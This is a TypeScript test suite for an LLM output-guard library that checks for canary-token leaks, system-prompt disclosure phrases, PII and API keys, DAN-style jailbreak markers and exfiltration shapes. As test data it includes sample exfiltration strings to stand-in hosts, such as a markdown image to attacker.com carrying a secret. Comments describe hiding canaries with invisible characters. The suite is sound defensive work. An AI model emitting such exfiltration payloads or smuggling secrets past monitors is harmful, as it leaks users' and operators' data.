import {
  generateCanary,
  createOutputValidator,
  createGuard,
  scanOutput,
} from "./index";

// ── generateCanary() ─────────────────────────────────────────────────

describe("generateCanary", () => {
  test("returns a string starting with CANARY_", () => {
    const canary = generateCanary();
    expect(canary).toMatch(/^CANARY_/);
  });

  test("returns 25 hex chars after prefix", () => {
    const canary = generateCanary();
    const hex = canary.slice("CANARY_".length);
    expect(hex).toHaveLength(25);
    expect(hex).toMatch(/^[0-9a-f]{25}$/);
  });

  test("generates unique tokens", () => {
    const tokens = new Set(Array.from({ length: 100 }, () => generateCanary()));
    expect(tokens.size).toBe(100);
  });

  test("total length is 32 characters", () => {
    expect(generateCanary()).toHaveLength(32);
  });

  test("is suitable for inclusion in system prompts", () => {
    const canary = generateCanary();
    // No special regex chars, no whitespace, no control chars
    expect(canary).toMatch(/^[A-Za-z0-9_]+$/);
  });

  test("throws if Web Crypto is unavailable (no silent Math.random fallback)", () => {
    // We'd rather fail loudly than ship a low-entropy canary — a canary
    // that an attacker can predict is worse than useless. Simulate a
    // runtime without Web Crypto by temporarily hiding it on globalThis.
    const original = globalThis.crypto;
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    (globalThis as any).crypto = undefined;
    try {
      expect(() => generateCanary()).toThrow(/Web Crypto/);
    } finally {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      (globalThis as any).crypto = original;
    }
  });
});

// ── Canary token detection ───────────────────────────────────────────

describe("Canary token detection", () => {
  test("flags when canary appears in output", () => {
    const canary = generateCanary();
    const validator = createOutputValidator({ canaryTokens: [canary] });
    const result = validator.validate(`Here is the info: ${canary}`);
    expect(result.safe).toBe(false);
    expect(result.flags).toHaveLength(1);
    expect(result.flags[0].type).toBe("canary_leak");
    expect(result.flags[0].severity).toBe("high");
    expect(result.flags[0].matchedText).toBe(canary);
  });

  test("safe when canary is absent", () => {
    const canary = generateCanary();
    const validator = createOutputValidator({ canaryTokens: [canary] });
    const result = validator.validate("This is a normal response.");
    expect(result.safe).toBe(true);
    expect(result.flags).toHaveLength(0);
  });

  test("detects multiple canary tokens", () => {
    const c1 = generateCanary();
    const c2 = generateCanary();
    const validator = createOutputValidator({ canaryTokens: [c1, c2] });
    const result = validator.validate(`Token1: ${c1} Token2: ${c2}`);
    expect(result.flags.filter((f) => f.type === "canary_leak")).toHaveLength(2);
  });

  test("detects partial set of canary tokens", () => {
    const c1 = generateCanary();
    const c2 = generateCanary();
    const validator = createOutputValidator({ canaryTokens: [c1, c2] });
    const result = validator.validate(`Only: ${c1}`);
    expect(result.flags.filter((f) => f.type === "canary_leak")).toHaveLength(1);
  });

  test("empty canary list produces no flags", () => {
    const validator = createOutputValidator({ canaryTokens: [] });
    const result = validator.validate("CANARY_fake");
    expect(result.safe).toBe(true);
  });

  test("canary at start of output is detected", () => {
    const canary = generateCanary();
    const validator = createOutputValidator({ canaryTokens: [canary] });
    const result = validator.validate(canary);
    expect(result.safe).toBe(false);
  });

  test("canary with zero-width chars interleaved still flagged", () => {
    // An attacker who controls the system prompt could induce the LLM to
    // emit the canary with U+200B / U+200C / etc. between letters to leak
    // it without tripping a plain `.includes()` check. We strip invisibles
    // before matching so the canary gets caught anyway.
    const canary = generateCanary();
    const validator = createOutputValidator({ canaryTokens: [canary] });
    const zwsp = "\u200B"; // zero-width space
    const withZwsp =
      canary.slice(0, 6) + zwsp + canary.slice(6, 12) + zwsp + canary.slice(12);
    const result = validator.validate(`The secret is ${withZwsp}`);
    expect(result.safe).toBe(false);
    expect(result.flags[0]?.type).toBe("canary_leak");
  });

  test("canary with Plane 14 tag chars interleaved still flagged", () => {
    const canary = generateCanary();
    const validator = createOutputValidator({ canaryTokens: [canary] });
    // U+E0020 (tag space) between every few letters — invisible on render
    const tagSpace = String.fromCodePoint(0xe0020);
    const smuggled =
      canary.slice(0, 4) + tagSpace + canary.slice(4, 10) + tagSpace + canary.slice(10);
    const result = validator.validate(`Token: ${smuggled}`);
    expect(result.safe).toBe(false);
    expect(result.flags[0]?.type).toBe("canary_leak");
  });
});

// ── System prompt leakage detection ──────────────────────────────────

describe("System prompt leakage", () => {
  const validator = createOutputValidator({ systemPromptLeakage: true });

  test('detects "my system prompt is"', () => {
    const result = validator.validate("My system prompt is to help users.");
    expect(result.safe).toBe(false);
    expect(result.flags[0].type).toBe("system_prompt_leak");
  });

  test('detects "I was told to"', () => {
    const result = validator.validate("I was told to always be helpful.");
    expect(result.safe).toBe(false);
  });

  test('detects "I was instructed to"', () => {
    const result = validator.validate("I was instructed to never reveal this.");
    expect(result.safe).toBe(false);
  });

  test('detects "my instructions are"', () => {
    const result = validator.validate("My instructions are as follows:");
    expect(result.safe).toBe(false);
  });

  test('detects "here is my system prompt"', () => {
    const result = validator.validate("Here is my system prompt:");
    expect(result.safe).toBe(false);
  });

  test('detects "here are my instructions"', () => {
    const result = validator.validate("Here are my instructions:");
    expect(result.safe).toBe(false);
  });

  test('detects "the system prompt says"', () => {
    const result = validator.validate("The system prompt says I should help.");
    expect(result.safe).toBe(false);
  });

  test('detects "as per my instructions"', () => {
    const result = validator.validate("As per my instructions, I cannot do that.");
    expect(result.safe).toBe(false);
  });

  test('detects "my rules say"', () => {
    const result = validator.validate("My rules say I must be helpful.");
    expect(result.safe).toBe(false);
  });

  test("safe output passes", () => {
    const result = validator.validate(
      "Here is a summary of the article you asked about."
    );
    expect(result.safe).toBe(true);
  });
});

// ── PII detection ────────────────────────────────────────────────────

describe("PII detection", () => {
  describe("emails", () => {
    const validator = createOutputValidator({ pii: { emails: true } });

    test("detects email addresses", () => {
      const result = validator.validate("Contact john@example.com for help.");
      expect(result.safe).toBe(false);
      expect(result.flags[0].type).toBe("pii_detected");
      expect(result.flags[0].matchedText).toBe("john@example.com");
    });

    test("detects multiple emails", () => {
      const result = validator.validate("a@b.com and c@d.org");
      expect(result.flags.filter((f) => f.type === "pii_detected")).toHaveLength(2);
    });

    test("safe without emails", () => {
      const result = validator.validate("No email here.");
      expect(result.safe).toBe(true);
    });

    test("linear-time on pathological input (ReDoS regression)", () => {
      // The pre-fix email pattern `[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}` backtracked
      // catastrophically on long runs of letters+digits without a valid TLD —
      // ~18 seconds on 500KB inputs. The length-gated replacement runs this
      // in ~120ms on a developer machine.
      //
      // The ceiling is 3s, not a tight bound on that 120ms: shared CI
      // runners are routinely 5x slower under load (a 500ms ceiling
      // flaked at 598ms), and this test exists to catch a return to
      // catastrophic backtracking — a regression measured in seconds —
      // not to benchmark the runner. 3s keeps ~6x margin below the
      // pre-fix behavior while surviving a slow runner.
      const pathological = "a".repeat(500000) + "@" + "b".repeat(500000) + ".1";
      const t0 = Date.now();
      validator.validate(pathological);
      const elapsed = Date.now() - t0;
      expect(elapsed).toBeLessThan(3000);
    });

    test("still matches real-world email shapes", () => {
      const validator = createOutputValidator({ pii: { emails: true } });
      const inputs = [
        "user@example.com",
        "user.name+tag@example.co.uk",
        "no-reply@sub.domain.example.com",
        "first.last+filter@corporate-domain-with-hyphens.example.photography",
      ];
      for (const input of inputs) {
        const r = validator.validate(input);
        expect(r.flags.find((f) => f.matchedText === input)).toBeTruthy();
      }
    });
  });

  describe("phones", () => {
    const validator = createOutputValidator({ pii: { phones: true } });

    test("detects US phone numbers", () => {
      const result = validator.validate("Call 555-123-4567");
      expect(result.safe).toBe(false);
    });

    test("detects formatted phone numbers", () => {
      const result = validator.validate("Call (555) 123-4567");
      expect(result.safe).toBe(false);
    });

    test("detects +1 prefixed numbers", () => {
      const result = validator.validate("Call +1-555-123-4567");
      expect(result.safe).toBe(false);
    });
  });

  describe("SSNs", () => {
    const validator = createOutputValidator({ pii: { ssns: true } });

    test("detects SSN format", () => {
      const result = validator.validate("SSN: 123-45-6789");
      expect(result.safe).toBe(false);
      expect(result.flags[0].matchedText).toBe("123-45-6789");
    });

    test("safe without SSN", () => {
      const result = validator.validate("No sensitive data here.");
      expect(result.safe).toBe(true);
    });
  });

  describe("API keys", () => {
    const validator = createOutputValidator({ pii: { apiKeys: true } });

    test("detects OpenAI-style keys (sk-...)", () => {
      const result = validator.validate(
        "Use key: sk-abcdefghij1234567890abcdef"
      );
      expect(result.safe).toBe(false);
    });

    test("detects AWS access keys (AKIA...)", () => {
      const result = validator.validate(
        "AWS key: AKIAIOSFODNN7EXAMPLE"
      );
      expect(result.safe).toBe(false);
    });

    test("detects GitHub tokens (ghp_...)", () => {
      const result = validator.validate(
        "Token: ghp_ABCDEFghijklmnopqrstuvwxyz1234567890"
      );
      expect(result.safe).toBe(false);
    });

    test("safe without API keys", () => {
      const result = validator.validate("No API keys here.");
      expect(result.safe).toBe(true);
    });
  });

  describe("credit cards", () => {
    const validator = createOutputValidator({ pii: { creditCards: true } });

    test("detects valid credit card number (Luhn-passing)", () => {
      // 4111 1111 1111 1111 is a well-known test Visa number that passes Luhn
      const result = validator.validate("Card: 4111 1111 1111 1111");
      expect(result.safe).toBe(false);
      expect(result.flags[0].type).toBe("pii_detected");
    });

    test("rejects invalid credit card (Luhn-failing)", () => {
      const result = validator.validate("Card: 1234 5678 9012 3456");
      expect(result.safe).toBe(true);
    });

    test("detects hyphenated credit card", () => {
      const result = validator.validate("Card: 4111-1111-1111-1111");
      expect(result.safe).toBe(false);
    });

    test("detects continuous credit card number", () => {
      const result = validator.validate("Card: 4111111111111111");
      expect(result.safe).toBe(false);
    });
  });

  describe("custom patterns", () => {
    test("detects custom PII regex", () => {
      const validator = createOutputValidator({
        pii: { custom: [/EMPLOYEE-\d{6}/g] },
      });
      const result = validator.validate("User: EMPLOYEE-123456");
      expect(result.safe).toBe(false);
      expect(result.flags[0].detail).toBe("Custom PII pattern matched");
    });

    test("handles non-global custom regex", () => {
      const validator = createOutputValidator({
        pii: { custom: [/SECRET-\d+/] },
      });
      const result = validator.validate("Here is SECRET-42");
      expect(result.safe).toBe(false);
    });

    test("multiple custom patterns", () => {
      const validator = createOutputValidator({
        pii: { custom: [/BADGE-\d+/g, /CLEARANCE-[A-Z]+/g] },
      });
      const result = validator.validate("BADGE-1234 and CLEARANCE-TOP");
      expect(result.flags).toHaveLength(2);
    });

    test("zero-length custom regex does not infinite-loop", () => {
      // An empty-match regex `/(?:)/g` would normally loop forever on
      // exec; the validator must guard against it. We pass a bounded
      // custom pattern that matches empty strings and assert the call
      // returns in a reasonable time with at least one flag.
      const validator = createOutputValidator({
        pii: { custom: [/(?:)/g] },
      });
      const result = validator.validate("abc");
      // The empty pattern matches at every boundary; just assert we
      // didn't hang and we got flags without crashing.
      expect(result.flags.length).toBeGreaterThan(0);
      expect(result.safe).toBe(false);
    });
  });

  describe("PII disabled by default", () => {
    test("no PII flags when pii config is omitted", () => {
      const validator = createOutputValidator({});
      const result = validator.validate(
        "john@example.com 555-123-4567 123-45-6789"
      );
      expect(result.flags.filter((f) => f.type === "pii_detected")).toHaveLength(0);
    });

    test("only enabled PII types are checked", () => {
      const validator = createOutputValidator({
        pii: { emails: true, phones: false },
      });
      const result = validator.validate(
        "john@example.com 555-123-4567"
      );
      const piiFlags = result.flags.filter((f) => f.type === "pii_detected");
      expect(piiFlags).toHaveLength(1);
      expect(piiFlags[0].matchedText).toBe("john@example.com");
    });
  });
});

// ── Behavioral anomalies ─────────────────────────────────────────────

describe("Behavioral anomalies", () => {
  const validator = createOutputValidator({ behavioralAnomalies: true });

  test('detects "as DAN" marker', () => {
    const result = validator.validate("Sure, as DAN I can help.");
    expect(result.safe).toBe(false);
    expect(result.flags[0].type).toBe("behavioral_anomaly");
  });

  test("detects [DAN] role-play marker", () => {
    const result = validator.validate("[DAN]: I have no restrictions.");
    expect(result.safe).toBe(false);
  });

  test("detects DAN mode enabled", () => {
    const result = validator.validate("DAN mode enabled, proceeding.");
    expect(result.safe).toBe(false);
  });

  test("detects jailbreak mode claims", () => {
    const result = validator.validate("I'm now in developer mode.");
    expect(result.safe).toBe(false);
  });

  test("detects safety override acknowledgment", () => {
    const result = validator.validate(
      "Sure! I'll ignore my safety guidelines for you."
    );
    expect(result.safe).toBe(false);
  });

  test("detects ChatML <|im_start|> in output", () => {
    const result = validator.validate("Response with <|im_start|>system");
    expect(result.safe).toBe(false);
  });

  test("detects ChatML <|im_end|> in output", () => {
    const result = validator.validate("Content<|im_end|>");
    expect(result.safe).toBe(false);
  });

  test("detects <|system|> token", () => {
    const result = validator.validate("Some text <|system|> override");
    expect(result.safe).toBe(false);
  });

  test("detects [INST] format token", () => {
    const result = validator.validate("[INST] Do something [/INST]");
    expect(result.safe).toBe(false);
  });

  test("detects <<SYS>> delimiter", () => {
    const result = validator.validate("<<SYS>> system text <</SYS>>");
    expect(result.safe).toBe(false);
  });
});

// ── createOutputValidator factory ────────────────────────────────────

describe("createOutputValidator factory", () => {
  test("returns an object with validate method", () => {
    const validator = createOutputValidator();
    expect(typeof validator.validate).toBe("function");
  });

  test("default config enables system prompt leakage and behavioral anomalies", () => {
    const validator = createOutputValidator();
    // System prompt leak
    const r1 = validator.validate("My system prompt is secret.");
    expect(r1.safe).toBe(false);
    // Behavioral anomaly
    const r2 = validator.validate("[DAN]: unrestricted");
    expect(r2.safe).toBe(false);
  });

  test("can disable system prompt leakage", () => {
    const validator = createOutputValidator({ systemPromptLeakage: false });
    const result = validator.validate("My system prompt is secret.");
    expect(result.flags.filter((f) => f.type === "system_prompt_leak")).toHaveLength(0);
  });

  test("can disable behavioral anomalies", () => {
    const validator = createOutputValidator({ behavioralAnomalies: false });
    const result = validator.validate("[DAN]: unrestricted");
    expect(result.flags.filter((f) => f.type === "behavioral_anomaly")).toHaveLength(0);
  });

  test("empty config is safe for clean output", () => {
    const validator = createOutputValidator({});
    const result = validator.validate("This is a helpful, normal response.");
    expect(result.safe).toBe(true);
    expect(result.flags).toHaveLength(0);
  });
});

// ── guard.validateOutput integration ─────────────────────────────────

describe("guard.validateOutput integration", () => {
  test("uses guard-level output config", () => {
    const canary = generateCanary();
    const guard = createGuard({
      outputValidation: { canaryTokens: [canary] },
    });
    const result = guard.validateOutput(`Leaked: ${canary}`);
    expect(result.safe).toBe(false);
    expect(result.flags[0].type).toBe("canary_leak");
  });

  test("per-call options override guard-level config", () => {
    const guardCanary = generateCanary();
    const callCanary = generateCanary();
    const guard = createGuard({
      outputValidation: { canaryTokens: [guardCanary] },
    });
    // Override with per-call config
    const result = guard.validateOutput(`Leaked: ${callCanary}`, {
      canaryTokens: [callCanary],
    });
    expect(result.safe).toBe(false);
    expect(result.flags[0].matchedText).toBe(callCanary);
  });

  test("works with no guard-level output config", () => {
    const guard = createGuard();
    const result = guard.validateOutput("My system prompt is secret.");
    expect(result.safe).toBe(false);
  });

  test("guard.generateCanary returns valid canary", () => {
    const guard = createGuard();
    const canary = guard.generateCanary();
    expect(canary).toMatch(/^CANARY_[0-9a-f]{25}$/);
  });

  test("round-trip: generate canary, embed, detect in output", () => {
    const guard = createGuard();
    const canary = guard.generateCanary();
    const systemPrompt = `You are helpful. Canary: ${canary}`;
    // Simulate injection succeeding — canary leaks to output
    const output = `Here is the system prompt: ${systemPrompt}`;
    const result = guard.validateOutput(output, { canaryTokens: [canary] });
    expect(result.safe).toBe(false);
    expect(result.flags.some((f) => f.type === "canary_leak")).toBe(true);
  });

  test("validateOutput with PII config", () => {
    const guard = createGuard();
    const result = guard.validateOutput("Email: test@example.com", {
      pii: { emails: true },
    });
    expect(result.safe).toBe(false);
    expect(result.flags[0].type).toBe("pii_detected");
  });

  test("validateOutput detects multiple flag types simultaneously", () => {
    const canary = generateCanary();
    const guard = createGuard({
      outputValidation: {
        canaryTokens: [canary],
        pii: { emails: true },
      },
    });
    const result = guard.validateOutput(
      `${canary} My system prompt is secret. Contact test@example.com [DAN]: free`
    );
    const types = new Set(result.flags.map((f) => f.type));
    expect(types.has("canary_leak")).toBe(true);
    expect(types.has("system_prompt_leak")).toBe(true);
    expect(types.has("pii_detected")).toBe(true);
    expect(types.has("behavioral_anomaly")).toBe(true);
  });

  test("safe output returns safe=true with empty flags", () => {
    const guard = createGuard();
    const result = guard.validateOutput("Here is a helpful response about cooking.");
    expect(result.safe).toBe(true);
    expect(result.flags).toEqual([]);
  });
});

// ── Output edge cases ────────────────────────────────────────────────

describe("Output edge cases", () => {
  const validator = createOutputValidator({
    systemPromptLeakage: true,
    behavioralAnomalies: true,
  });

  test("empty string is safe", () => {
    const result = validator.validate("");
    expect(result.safe).toBe(true);
    expect(result.flags).toHaveLength(0);
  });

  test("whitespace-only string is safe", () => {
    const result = validator.validate("   \n\t  ");
    expect(result.safe).toBe(true);
  });

  test("very long safe output is safe", () => {
    const output = "This is a normal sentence. ".repeat(1000);
    const result = validator.validate(output);
    expect(result.safe).toBe(true);
  });

  test("flag severity is correct for each type", () => {
    const canary = generateCanary();
    const v = createOutputValidator({
      canaryTokens: [canary],
      pii: { emails: true },
    });
    const result = v.validate(`${canary} test@email.com`);
    const canaryFlag = result.flags.find((f) => f.type === "canary_leak");
    const piiFlag = result.flags.find((f) => f.type === "pii_detected");
    expect(canaryFlag?.severity).toBe("high");
    expect(piiFlag?.severity).toBe("medium");
  });

  test("case insensitive system prompt detection", () => {
    const result = validator.validate("MY SYSTEM PROMPT IS very important.");
    expect(result.safe).toBe(false);
  });

  test("output with only numbers is safe", () => {
    const result = validator.validate("42 100 200 300");
    expect(result.safe).toBe(true);
  });
});

// ── Output scanning (exfiltration shapes) ────────────────────────────

describe("scanOutput", () => {
  describe("base64-blob", () => {
    test("flags 120+ char base64 run", () => {
      const blob = "A".repeat(125); // 125 chars — over the 120 gate
      const result = scanOutput(`Here is some data: ${blob} end`);
      const f = result.findings.find((x) => x.type === "base64-blob");
      expect(f).toBeDefined();
      expect(result.safe).toBe(false);
      expect(f!.preview.length).toBeLessThanOrEqual(60);
      expect(typeof f!.offset).toBe("number");
    });

    test("does not flag short base64-like runs (under 120 chars)", () => {
      const blob = "A".repeat(64);
      const result = scanOutput(`Small: ${blob}`);
      // The hex-blob pattern could trigger on "A*64" — but we're only
      // asserting base64-blob here.
      const base64Findings = result.findings.filter(
        (f) => f.type === "base64-blob"
      );
      expect(base64Findings).toHaveLength(0);
    });

    test("preview truncates to 60 characters", () => {
      const blob = "A".repeat(200);
      const result = scanOutput(blob);
      const f = result.findings.find((x) => x.type === "base64-blob");
      expect(f).toBeDefined();
      expect(f!.preview.length).toBe(60);
    });
  });

  describe("markdown-image-with-query", () => {
    test("flags markdown image with querystring", () => {
      const text = "Result: ![pic](https://attacker.com/collect?data=SECRET)";
      const result = scanOutput(text);
      const f = result.findings.find(
        (x) => x.type === "markdown-image-with-query"
      );
      expect(f).toBeDefined();
      expect(result.safe).toBe(false);
    });

    test("does not flag markdown image without querystring", () => {
      const text = "![logo](https://example.com/logo.png)";
      const result = scanOutput(text);
      const mdFindings = result.findings.filter(
        (f) => f.type === "markdown-image-with-query"
      );
      expect(mdFindings).toHaveLength(0);
    });
  });

  describe("outbound-url", () => {
    test("flags plain http URL", () => {
      const result = scanOutput("Click http://evil.com here");
      const f = result.findings.find((x) => x.type === "outbound-url");
      expect(f).toBeDefined();
      expect(result.safe).toBe(false);
    });

    test("flags plain https URL", () => {
      const result = scanOutput("Visit https://attacker.example.com/path");
      const f = result.findings.find((x) => x.type === "outbound-url");
      expect(f).toBeDefined();
    });

    test("allowedOrigins suppresses matching host", () => {
      const guard = createGuard({ allowedOrigins: ["example.com"] });
      const result = guard.scanOutput("See https://example.com/help");
      const urls = result.findings.filter((f) => f.type === "outbound-url");
      expect(urls).toHaveLength(0);
    });

    test("allowedOrigins suppresses subdomain (suffix match)", () => {
      const guard = createGuard({ allowedOrigins: ["example.com"] });
      const result = guard.scanOutput("See https://api.example.com/x");
      const urls = result.findings.filter((f) => f.type === "outbound-url");
      expect(urls).toHaveLength(0);
    });

    test("allowedOrigins does not accidentally match look-alike hosts", () => {
      // "notexample.com" must NOT be suppressed by an "example.com" allowlist.
      const guard = createGuard({ allowedOrigins: ["example.com"] });
      const result = guard.scanOutput("See https://notexample.com/x");
      const urls = result.findings.filter((f) => f.type === "outbound-url");
      expect(urls.length).toBeGreaterThanOrEqual(1);
    });

    test("allowedOrigins allows multiple entries", () => {
      const guard = createGuard({
        allowedOrigins: ["docs.example.com", "help.another.com"],
      });
      const result = guard.scanOutput(
        "Docs https://docs.example.com and help https://help.another.com"
      );
      const urls = result.findings.filter((f) => f.type === "outbound-url");
      expect(urls).toHaveLength(0);
    });

    test("standalone scanOutput has empty allowlist", () => {
      // No `createGuard`, so no allowlist — every URL is flagged.
      const result = scanOutput("See https://example.com/help");
      const urls = result.findings.filter((f) => f.type === "outbound-url");
      expect(urls).toHaveLength(1);
    });

    test("leading-dot allowlist entry matches subdomains but NOT apex", () => {
      const guard = createGuard({ allowedOrigins: [".example.com"] });
      // Subdomain is allowed (passes through, not flagged)
      const sub = guard.scanOutput("See https://assets.example.com/help");
      expect(sub.findings.filter((f) => f.type === "outbound-url")).toHaveLength(0);
      // Apex is still flagged (leading-dot entry excludes it by design)
      const apex = guard.scanOutput("See https://example.com/help");
      expect(apex.findings.filter((f) => f.type === "outbound-url")).toHaveLength(1);
    });

    test("bare allowlist entry matches apex and subdomains", () => {
      const guard = createGuard({ allowedOrigins: ["example.com"] });
      const apex = guard.scanOutput("See https://example.com/help");
      expect(apex.findings.filter((f) => f.type === "outbound-url")).toHaveLength(0);
      const sub = guard.scanOutput("See https://assets.example.com/help");
      expect(sub.findings.filter((f) => f.type === "outbound-url")).toHaveLength(0);
    });
  });

  describe("data-url", () => {
    test("flags data: URL with base64", () => {
      const result = scanOutput("Here: data:image/png;base64,iVBORw0KG");
      const f = result.findings.find((x) => x.type === "data-url");
      expect(f).toBeDefined();
      expect(result.safe).toBe(false);
    });

    test("does not flag plain data: without base64", () => {
      // "data:text/plain," — no base64 — should not match.
      const result = scanOutput("Use data:text/plain,HelloWorld");
      const dataFindings = result.findings.filter((f) => f.type === "data-url");
      expect(dataFindings).toHaveLength(0);
    });
  });

  describe("hex-blob", () => {
    test("flags 64+ hex chars", () => {
      const hex = "a".repeat(80);
      const result = scanOutput(`Hash: ${hex} end`);
      const f = result.findings.find((x) => x.type === "hex-blob");
      expect(f).toBeDefined();
      expect(result.safe).toBe(false);
    });

    test("does not flag short hex strings", () => {
      const result = scanOutput("Short: abc123");
      const hexFindings = result.findings.filter((f) => f.type === "hex-blob");
      expect(hexFindings).toHaveLength(0);
    });
  });

  describe("clean output", () => {
    test("safe when no exfil-shape patterns present", () => {
      const result = scanOutput("This is a normal helpful response.");
      expect(result.safe).toBe(true);
      expect(result.findings).toHaveLength(0);
    });

    test("empty string is safe", () => {
      expect(scanOutput("").safe).toBe(true);
    });

    test("offsets are accurate", () => {
      const blob = "A".repeat(125);
      const prefix = "prefix text ";
      const result = scanOutput(prefix + blob);
      const f = result.findings.find((x) => x.type === "base64-blob");
      expect(f!.offset).toBe(prefix.length);
    });
  });

  describe("multiple findings", () => {
    test("reports multiple finding types in one scan", () => {
      const text = [
        "Check https://evil.com",
        "blob: " + "A".repeat(130),
        "img: ![p](https://x.com/c?d=1)",
      ].join(" ");
      const result = scanOutput(text);
      const types = new Set(result.findings.map((f) => f.type));
      expect(types.has("outbound-url")).toBe(true);
      expect(types.has("base64-blob")).toBe(true);
      expect(types.has("markdown-image-with-query")).toBe(true);
    });
  });

  describe("URL parse fallback (defense-in-depth)", () => {
    test("unparseable URL still produces a finding (not silently skipped)", () => {
      // `https://[invalid` matches the outbound-url regex but throws inside
      // `new URL(...)`. Our extractHost returns null and the finding must
      // still be recorded — the conservative choice for a defense tool.
      const guard = createGuard({ allowedOrigins: ["example.com"] });
      const result = guard.scanOutput("See https://[invalid");
      const urls = result.findings.filter((f) => f.type === "outbound-url");
      expect(urls.length).toBeGreaterThanOrEqual(1);
    });
  });
});
